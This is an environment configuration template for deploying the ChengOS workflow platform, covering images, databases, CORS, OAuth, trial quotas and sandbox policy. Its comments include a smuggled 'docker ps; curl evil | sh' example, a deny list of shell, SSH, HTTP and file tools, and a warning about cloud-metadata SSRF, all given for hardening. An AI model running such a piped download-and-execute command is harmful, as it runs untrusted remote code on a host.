# ============================================================
# ChengOS Unified Deployment — Environment Template
# Used by hybrid, docker, and distributed deployments.
# Copy to .env and fill in all values, or run the mode-specific
# generate-env.sh / start.sh script to generate secrets automatically.
# ============================================================

# ------------------------------------------------------------
# Docker images (used by docker deployments)
#
# CHENGOS_VERSION is the single release pin. API, UI, App, and CLI all resolve
# their tag from it, so a Docker installation can never mix images from
# unrelated releases.
#
#   CHENGOS_VERSION=0.1.0    pin an exact, reproducible release (recommended)
#   CHENGOS_VERSION=latest   convenience default for a first install only
#
# `chengos.sh update` rewrites this value only after the selected release has
# been verified, and records the previous value so `chengos.sh rollback` can
# restore it. Never edit it to `latest` on a production install: `latest` is a
# moving pointer, so rollback would become ambiguous.
# ------------------------------------------------------------
CHENGOS_VERSION=latest

# Per-image overrides. Precedence: CHENGOS_<SERVICE>_IMAGE beats CHENGOS_VERSION
# for that one service. Use them for private registries or local development
# builds. While ANY override is set, coordinated Docker release updates are
# disabled and `chengos.sh status` says so.
# CHENGOS_API_IMAGE=registry.example.com/chengos/chengos:0.1.0
# CHENGOS_UI_IMAGE=registry.example.com/chengos/chengos_ui:0.1.0
# CHENGOS_APP_IMAGE=registry.example.com/chengos/chengos_app:0.1.0
# CHENGOS_CLI_IMAGE=registry.example.com/chengos/chengos_cli:0.1.0

# Legacy alias kept for older compose overlays; prefer CHENGOS_VERSION.
CHENGOS_IMAGE=chengos/chengos:latest

# ------------------------------------------------------------
# Infrastructure secrets (used by docker-compose and the app)
# Generate with: openssl rand -hex 16
# ------------------------------------------------------------
POSTGRES_PASSWORD=change_this_postgres_password
REDIS_PASSWORD=change_this_redis_password

# ------------------------------------------------------------
# Application connection strings
# Hostname depends on deployment mode:
#   - hybrid / managed-process: 127.0.0.1
#   - docker / production:       postgres / redis / qdrant
#   - distributed:               your external database host
# ------------------------------------------------------------
DATABASE_URL=postgres://tianai_db:change_this_postgres_password@127.0.0.1:5432/master_router
REDIS_URL=redis://:change_this_redis_password@127.0.0.1:6379
QDRANT_URL=http://127.0.0.1:6334

# ------------------------------------------------------------
# Hybrid / native deployment switches
# ------------------------------------------------------------
DB_INSTALL_MODE=managed-process  # 'managed-process' (local user sandbox) or 'system-service' (apt/systemd service)
ENABLE_REDIS=false
ENABLE_QDRANT=false

# ------------------------------------------------------------
# Exposed host ports
# ------------------------------------------------------------
PORT=3000
API_PORT=3000
UI_PORT=8080
APP_PORT=5055

# ------------------------------------------------------------
# Connection pool tuning
# ------------------------------------------------------------
DATABASE_MAX_CONNECTIONS=10
DATABASE_MIN_CONNECTIONS=1
DATABASE_CONNECTION_TIMEOUT=30
REDIS_MAX_CONNECTIONS=10
REDIS_MIN_CONNECTIONS=1
REDIS_CONNECTION_TIMEOUT=30

# ------------------------------------------------------------
# Agent Memory (explicit host/port for agent memory nodes)
# ------------------------------------------------------------
DB_HOST=127.0.0.1
DB_PORT=5432
DB_NAME=master_router
DB_USER=tianai_db
DB_PASSWORD=change_this_postgres_password
REDIS_HOST=127.0.0.1
REDIS_PORT=6379
# REDIS_PASSWORD is defined in the Infrastructure secrets section above
# REDIS_DB=0

# ------------------------------------------------------------
# Required application secrets
# Generate with: openssl rand -hex 32
# ------------------------------------------------------------
CREDENTIAL_MASTER_KEY_1=replace_with_64_hex_chars
JWT_SECRET=replace_with_64_hex_chars

# ------------------------------------------------------------
# Application server
# ------------------------------------------------------------
BIND_ADDRESS=0.0.0.0

# ------------------------------------------------------------
# Runtime behaviour
# ------------------------------------------------------------
# Fail-closed public demo API. Initialize the demo user/workspace before
# enabling. Saves, executions, WebSockets and unrelated APIs are denied.
CHENG_DEMO_MODE=false
RUN_MIGRATIONS=true
RUST_LOG=info
RUST_BACKTRACE=1
# DEBUG_ENV_LOADED=false

# ------------------------------------------------------------
# Skills directories
# ------------------------------------------------------------
SKILLS_DIR=./skills
# NODE_SKILLS_DIR=/app/node_skills

# ------------------------------------------------------------
# Scheduler
# ------------------------------------------------------------
SCHEDULER_ENABLED=true
SCHEDULER_NODE_ID=node-1
SCHEDULER_HOT_WINDOW_SECS=60
SCHEDULER_WARM_WINDOW_SECS=300
SCHEDULER_SWEEPER_INTERVAL_SECS=30
SCHEDULER_LOCK_TIMEOUT_SECS=60
SCHEDULER_MAX_CONCURRENCY=8

# ------------------------------------------------------------
# CORS — set CORS_PERMISSIVE=false and list your origins in prod
# ------------------------------------------------------------
CORS_PERMISSIVE=true
CORS_ALLOWED_ORIGINS=https://your-frontend.example.com

# ------------------------------------------------------------
# MCP (optional)
# ------------------------------------------------------------
MCP_ENABLED=false
# MCP_SERVER_TOKEN=replace_with_a_long_random_token
# MCP_GATEWAY_PORT_START=9100

# ------------------------------------------------------------
# OAuth2 (optional)
# ------------------------------------------------------------
# Client IDs must be provided by the user/operator from each provider's app
# console or official partner process. PKCE providers do not require
# client_secret; GitHub OAuth apps generally do.
# OAUTH2_OPENAI_CLIENT_ID=
# OAUTH2_OPENAI_CLIENT_SECRET=
# OAUTH2_ANTHROPIC_CLIENT_ID=
# OAUTH2_ANTHROPIC_CLIENT_SECRET=
# OAUTH2_GOOGLE_CLIENT_ID=
# OAUTH2_GOOGLE_CLIENT_SECRET=
# OAUTH2_GITHUB_CLIENT_ID=
# OAUTH2_GITHUB_CLIENT_SECRET=
# OAUTH2_MICROSOFT_CLIENT_ID=
# OAUTH2_MICROSOFT_CLIENT_SECRET=
# Must exactly match the redirect URI registered for the OAuth2 app.
# OAUTH2_REDIRECT_URI=https://your-frontend.example.com/oauth2-callback.html

# ------------------------------------------------------------
# Email (optional)
# ------------------------------------------------------------
EMAIL_ENABLED=false
# SMTP_HOST=smtp.example.com
# SMTP_PORT=587
# SMTP_USERNAME=mailer@example.com
# SMTP_PASSWORD=change_me
# SMTP_FROM=mailer@example.com
# PASSWORD_RESET_BASE_URL=https://your-frontend.example.com/reset-password

# ------------------------------------------------------------
# Frontend runtime / public URLs (used by docker deployments)
# ------------------------------------------------------------
# UI_API_BASE_URL=/api/v1
# UI_WS_URL=/ws
# APP_API_BASE_URL=/api/v1
# APP_WS_URL=/ws/executions
# APP_CHANNEL_ID=weather-app
# APP_BOUND_WORKFLOW_ID=
# PUBLIC_UI_URL=https://chengos.example.com
# PUBLIC_APP_URL=https://app.chengos.example.com
# PUBLIC_API_URL=https://api.chengos.example.com

# ------------------------------------------------------------
# Cheng CLI (used by docker deployments, interactive container)
# ------------------------------------------------------------
CHENG_SERVER_URL=http://api:3000

# ------------------------------------------------------------
# Code nodes / private model endpoints
#
# The defaults below suit a self-hosted deployment on a trusted network --
# code nodes available, and local model endpoints (Ollama, LM Studio,
# vLLM on 127.0.0.1 / 10.x / 192.168.x) reachable.
#
# A PUBLIC deployment must change all three. See the block below.
# ------------------------------------------------------------
CHENG_ENABLE_CODE_PYTHON=true
CHENG_ENABLE_CODE_JS=true
# SSRF guard on user-supplied LLM endpoints. `true` lets a credential point the
# server at loopback/private/link-local addresses -- which is what makes a local
# Ollama work, and also what would let an untrusted user aim the server at cloud
# metadata (169.254.169.254) or an internal service. Anything public: leave unset.
ALLOW_PRIVATE_LLM_ENDPOINTS=true

# ------------------------------------------------------------
# Public trial deployment
#
# Node types refused at REGISTRATION. A node named here never enters the
# registry: it is absent from the catalog, has no schema, and cannot be
# resolved at execution time -- so a workflow referencing it fails to run no
# matter how it was created (imported, seeded from a template, or saved before
# the list changed). That is what separates this from the save-time policy in
# CHENG_DISABLED_NODES, which only rejects workflows as they are saved.
#
# Deployment-wide, with no per-user granularity. Leave unset for a private
# install; the list below is the starting point for a public trial.
#
# Also set for a public trial:
#   CHENG_ENABLE_CODE_PYTHON=false
#   CHENG_ENABLE_CODE_JS=false
#   ALLOW_PRIVATE_LLM_ENDPOINTS  (remove the line -- it defaults to off)
#
# The five groups, and why each is here:
#   egress    - fetches a URL the user controls; the way data leaves the box
#   process   - runs a program on the host
#   files     - reads or writes the server's filesystem
#   secrets   - emits resolved credentials into the workflow (env_vars output)
#   fan-out   - creates or triggers further executions, multiplying any quota
#
# Verify your trial workflow still runs after enabling this: tools/tool_hub
# and tools/skills_hub are how an agent reaches its tools, so banning them
# changes what the agent demo can do.
# ------------------------------------------------------------
# CHENG_DISABLED_NODE_TYPES=tools/http,tools/web,tools/browser,tools/mail,tools/ssh,tools/mcp_hub,tools/fetch_repository,tools/vps_benchmark,tools/code_shell,tools/runtime,tools/cli_install,tools/workspace_shell,tools/workspace_git,tools/workspace_tests,tools/file_ops_hub,tools/write_file,tools/edit_file,tools/patch_file,tools/delete_file,tools/move_file,tools/copy_file,tools/backup_file,tools/rollback_file,tools/view_file,tools/file_info,tools/file_tree,tools/list_directory,tools/search_files,io/read_file,utils/credential,tools/import_workflow,tools/schedule,tools/subflow,tools/batch_subflow,tools/skill,tools/skills_hub,tools/tool_hub,tools/write_skill_package

# --- The trial model ------------------------------------------------------
# A model the deployment pays for, offered to users who have no key of their
# own. Its key is read here at request time and never enters the workflow: the
# config that flows between nodes carries an empty `api_key` and a marker, so
# no node -- present or future -- can read the secret out of a node output.
#
# Address it from a workflow as the model `server::<model name>`, or just
# `server::` for the first model listed. A request that names NO model at all
# also lands here whenever these variables are set, so a client can send a
# message without choosing anything and get the trial model. (With none set,
# a workflow that names no model still errors, as it always did.) Provider,
# endpoint and model are forced from these variables when the marker is set,
# so a hand-crafted workflow cannot redirect the key to an endpoint of its own.
#
# PROVIDER, MODELS and API_KEY are required together; set none of them and no
# trial model is offered. Give the model an 8k window by declaring
# `max_input_tokens = 8000` for it in config/providers.toml -- request
# preflight, history compaction and the context meter in the UI all divide by
# that one number.
# CHENG_SERVER_LLM_PROVIDER=openai
# CHENG_SERVER_LLM_MODELS=gpt-4o-mini
# CHENG_SERVER_LLM_API_KEY=sk-...
# CHENG_SERVER_LLM_ENDPOINT=https://api.openai.com/v1
#
# More keys: number them from 2 (scanned up to 20). Each numbered slot is an
# independent provider/key/models set, so you can put the same model behind
# several keys, offer several models, or both. Requests are handed out
# round-robin across the backends offering the model asked for -- spreading N
# requests over K keys divides the per-key rate-limit pressure by K before
# anything fails, rather than draining one key and reacting after it breaks.
#
# A key that is genuinely exhausted still takes its turn and fails; the retry
# policy sees a retryable error and the next attempt draws a fresh backend.
# Taking a key out of rotation on failure is NOT implemented -- that needs the
# provider's error to travel back from the LLM service, which knows nothing
# about keys.
#
# Each slot needs PROVIDER, MODELS and API_KEY together. A half-filled slot is
# dropped with a warning rather than used, because a key with no model list
# would 400 at the provider on one request in K.
# CHENG_SERVER_LLM_2_PROVIDER=anthropic
# CHENG_SERVER_LLM_2_MODELS=claude-haiku-4-5-20251001
# CHENG_SERVER_LLM_2_API_KEY=sk-ant-...
# CHENG_SERVER_LLM_2_ENDPOINT=
#
# CHENG_SERVER_LLM_3_PROVIDER=openai
# CHENG_SERVER_LLM_3_MODELS=gpt-4o-mini
# CHENG_SERVER_LLM_3_API_KEY=sk-another-openai-key

# --- The trial quota ------------------------------------------------------
# Messages one user may send per allowance. Counted at turn ingress rather than
# per HTTP request or per LLM call: a request is not what costs anything, and
# one turn can drive an agent loop through several model calls -- charging per
# call would spend a 15-message allowance in three exchanges.
#
# CHENG_TRIAL_WINDOW picks how the allowance comes back:
#   daily                  a fresh allowance at local midnight (the default)
#   daily@Asia/Shanghai    the same, in a named IANA zone
#   5h                     rolling: each message frees its own slot 5h later
# CHENG_TRIAL_TIMEZONE sets the zone for a bare `daily`; UTC when unset. A day
# boundary is a local idea -- resetting a Shanghai user's credits at 08:00
# their time would be inexplicable.
#
# Exempt from the quota: anyone holding an LLM credential of their own (they
# spend their own key, so capping them serves nobody), and a reply to a pending
# approval (refusing that would strand a turn already running with nobody able
# to release it).
#
# Refusal is 429 `TURN_QUOTA_EXHAUSTED` carrying limit / retry_at /
# retry_after_seconds / daily. The wording shown to the user belongs to the
# frontend, which has the translations; `daily: true` is what lets it say
# "tomorrow" instead of printing a timestamp.
#
# Unset means no quota, and the ingress does not even read usage. Bounds
# messages, NOT spend: a message has no fixed cost, so this is a fairness
# device against one user monopolising the deployment, not a budget.
# CHENG_TRIAL_TURNS_PER_WINDOW=15
# CHENG_TRIAL_WINDOW=daily
# CHENG_TRIAL_TIMEZONE=Asia/Shanghai

# ------------------------------------------------------------
# Workspace root for non-CLI workflow execution
# Absolute path used as the base directory for code_shell / code_python
# working_subdir resolution when no CLI session sandbox is present.
# If unset, defaults to {repo_root}/workspaces (dev) or ./workspaces (deploy).
# ------------------------------------------------------------
#CHENG_WORKSPACE_ROOT=/opt/chengos/workspace

# ------------------------------------------------------------
# Browser tool (optional)
# Connect to a remote Chrome instance via CDP instead of launching locally.
# Set this if the server has no Chrome/Chromium installed or disk space is limited.
# The remote Chrome must be started with --remote-debugging-port=9222 --remote-debugging-address=0.0.0.0
# Example: CHROME_URL=http://10.0.0.5:9222
# ------------------------------------------------------------
#CHROME_URL=http://127.0.0.1:9222

# Idle timeout in seconds for keep-alive browser sessions. After this many
# seconds without a call, the Chrome process is automatically closed.
# Default: 300 (5 minutes). Only effective for keep_alive session mode.
#BROWSER_IDLE_TIMEOUT_SECS=300

# ------------------------------------------------------------
# Deployment settings panel
# Absolute path of this file, so the API can edit it on behalf of a platform
# administrator. generate-env.sh fills it in for native installs; Docker
# overrides it with the in-container mount path (/app/.env).
# Leave it unset to make the settings panel read-only.
# ------------------------------------------------------------
#CHENGOS_ENV_FILE=

# ------------------------------------------------------------
# Sandbox policy (host operator only)
# Read once at startup and immutable thereafter — workflow JSON, node inputs
# and LLM output can never influence it. Any malformed entry fails the WHOLE
# policy closed rather than accepting part of it.
#
# CHENG_SANDBOX_ALLOW_UNSANDBOXED is the master switch: with it off, the other
# two do nothing. With it on, a script still runs on the host only if it
# matches an entry in the allowlist file byte for byte (no prefix matching —
# `docker ps; curl evil | sh` must not pass because `docker ps` is listed).
# ------------------------------------------------------------
CHENG_SANDBOX_ALLOW_UNSANDBOXED=false
#CHENG_SANDBOX_HOST_COMMANDS_FILE=/opt/chengos/config/host-commands.txt
#CHENG_SANDBOX_EXTRA_READ_ROOTS=/srv/data:/srv/logs

# ------------------------------------------------------------
# Cheng CLI sandboxes
# Colon-separated absolute directories available as Cheng CLI sandboxes.
# The CLI and API must see these paths in the same filesystem namespace.
# CLI sessions are disabled entirely if this is not configured.
# generate-env.sh replaces this with the package-local absolute workspace path.
# ------------------------------------------------------------
CHENG_CLI_ALLOWED_ROOTS=/opt/chengos/workspace

# ------------------------------------------------------------
# Global config directory (shortcuts.yaml, presets.yaml)
# Shared across all workspaces. Per-workspace configs override these.
# Docker: /app/config (bind-mounted from deploy/config/)
# Native: auto-detected from <install-dir>/config — uncomment to override.
# ------------------------------------------------------------
#CHENG_GLOBAL_CONFIG_DIR=/app/config

# ------------------------------------------------------------
# Workflow template catalog directory
# Read-only source of built-in workflow templates installed into new
# workspaces on bootstrap. Each subdirectory is one template package
# (template.json + workflow.json). Place your example workflows here.
# Docker: /app/workflow-templates (bind-mounted from deploy/workflow-templates/)
# Native: auto-detected from <install-dir>/workflow-templates — uncomment to override.
# ------------------------------------------------------------
#TEMPLATE_WORKFLOWS_DIR=/app/workflow-templates

# ------------------------------------------------------------
# Registration gate — who may create an account on this deployment
#
# Replaces the old compile-time CHENG_MAX_USERS: that was injected through
# option_env!, so raising or lowering it meant rebuilding the binary.
#
# open      anyone may register (the previous behaviour, and the default)
# allowlist only listed identities, or a valid invite code
# invite    only a valid invite code
# closed    nobody
#
# The first account on an empty deployment is ALWAYS admitted regardless of
# this setting, and becomes the platform administrator — otherwise a fresh
# install with a strict setting would have no way to create anyone at all.
#
# This takes effect on restart. To stop registrations immediately, use the
# freeze switch in Settings → Admissions, or `./chengos.sh admin signup-freeze`.
# ------------------------------------------------------------
#CHENG_SIGNUP_MODE=open

# Who may create an account through ChengID. Deliberately does NOT follow
# CHENG_SIGNUP_MODE: a deployment that is open to password registration has not
# thereby decided that anyone holding a ChengID account may provision one here.
#CHENG_SIGNUP_MODE_CHENGID=allowlist

# ------------------------------------------------------------
# ChengID single sign-on (optional)
#
# Leave CHENGID_ISSUER empty to disable it; every ChengID entry point is then
# hidden rather than shown as a button that cannot work.
#
# Self-hosted deployments sign in through the device flow (RFC 8628): the page
# shows a short code, the person approves it on the ChengID site, and this
# instance polls. That is the only flow available off the official origin —
# ChengID compares redirect_uri for exact equality and only an operator can
# register a client, so a self-hosted address can never be registered.
#
# Note the device flow yields no email address, so ChengID admissions on a
# self-hosted deployment must be written as subject entries, not email ones.
# ------------------------------------------------------------
#CHENGID_ISSUER=https://id.example.com
#CHENGID_CLIENT_ID=chengflow-selfhosted
# Official deployment only: enables the authorization-code + PKCE flow.
#CHENGID_REDIRECT_URI=https://app.example.com/api/v1/auth/chengid/callback
#CHENGID_CLIENT_SECRET=

# Which credentials are accepted:
#   legacy   password only (the default when CHENGID_ISSUER is unset)
#   dual     both (the default when it is set)
#   chengid  ChengID only — password sign-in is refused
#
# In `chengid` mode the process REFUSES TO START when ChengID is unreachable:
# passwords are off, so an unreachable issuer would mean nobody can sign in at
# all, and failing at boot keeps the previous working process alive.
#CHENG_AUTH_MODE=dual

# ---------------------------------------------------------------------------
# Browser extension (ChengTranslate)
# ---------------------------------------------------------------------------
# The extension build this server tells clients to run, served from
# GET /api/v1/version and compared by the extension against its own manifest
# version at most once a day.
#
# Why it exists: a self-hosted extension is installed through "Load unpacked",
# which Chrome never auto-updates. Without this, a user whose extension has
# fallen behind the backend sees it misbehave with no indication that the
# version is the cause.
#
# Leave unset unless the extension ships out of step with the backend; the
# binary carries a default that is bumped alongside the extension's manifest.
#RECOMMENDED_EXTENSION_VERSION=0.2.0

# The extension archive is served from /downloads/cheng-translate.zip. It is
# generated at install/upgrade time by chengos.sh (never committed to git), so
# deploy/ui/downloads/ is expected to be absent from a fresh checkout.
